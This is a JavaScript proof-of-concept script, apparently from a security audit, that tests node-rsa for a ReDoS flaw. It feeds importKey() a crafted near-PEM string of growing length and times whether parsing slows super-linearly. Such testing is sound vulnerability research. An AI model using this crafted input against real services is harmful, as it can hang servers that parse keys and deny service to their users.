// node-rsa — NR-01: ReDoS in PEM format autodetection.
// Drives importKey() with a crafted string designed to trigger
// catastrophic backtracking in the opensshFormat/pkcs1Format/pkcs8Format
// autoImport regex.
const NodeRSA = require("node-rsa");

console.log("node-rsa PoC — version:", require("node-rsa/package.json").version);

// Build an "almost-PEM" string that pushes the regex into deep backtracking.
// The PEM regex matches lines like:
//   -----BEGIN <TYPE>-----
//   <base64>
//   -----END <TYPE>-----
// The vulnerability: the regex has alternation between Type strings
// (e.g., "RSA PRIVATE KEY" | "PRIVATE KEY" | "PUBLIC KEY") AND the
// base64 body. A string that *partially* matches the start of a
// label can force backtracking.
function buildEvilPEM(n) {
  // Header that does NOT match a known label, but starts with the
  // prefix "-----BEGIN " so the regex enters its header matcher and
  // has to backtrack across alternations.
  const head = "-----BEGIN ";
  const body = "A".repeat(n);
  const tail = "\n-----END MALFORMED-----";
  return head + body + tail;
}

async function testReDoS(n) {
  const evil = buildEvilPEM(n);
  const rsa = new NodeRSA();
  const t0 = process.hrtime.bigint();
  try {
    rsa.importKey(evil);
  } catch (e) {
    // expected — invalid PEM, but did the regex hang first?
  }
  const t1 = process.hrtime.bigint();
  const ms = Number(t1 - t0) / 1e6;
  console.log(`  n=${n} (${evil.length} bytes)  importKey() took ${ms.toFixed(1)} ms`);
  return ms;
}

(async () => {
  console.log("\n=== NR-01: ReDoS in PEM auto-detect ===");
  // Run with progressively larger inputs.  A quadratic-or-worse regex
  // shows up as a steep growth curve.
  const sizes = [100, 500, 1000, 2000, 4000, 8000];
  const times = [];
  for (const n of sizes) {
    times.push(await testReDoS(n));
  }
  const ratio = times[times.length - 1] / Math.max(times[0], 0.001);
  console.log(`\n  time growth ratio (largest/smallest): ${ratio.toFixed(1)}x`);
  // Heuristic: if doubling input length causes > 4x time growth, it's
  // a strong ReDoS signal (quadratic or worse).
  const linearExpected = sizes[sizes.length - 1] / sizes[0];
  console.log(`  linear baseline ratio: ${linearExpected}x`);
  console.log(`  ReDoS signal: ${ratio > 2 * linearExpected ? "STRONG" : "weak/none"}`);
  if (ratio > 2 * linearExpected) {
    console.log("  >>> NR-01 CONFIRMED: time grows super-linearly with input size <<<");
    process.exit(0);
  } else {
    console.log("  >>> NR-01 NOT REPRODUCED on this Node version (V8 may have backtracking-budget mitigation) <<<");
    process.exit(1);
  }
})();
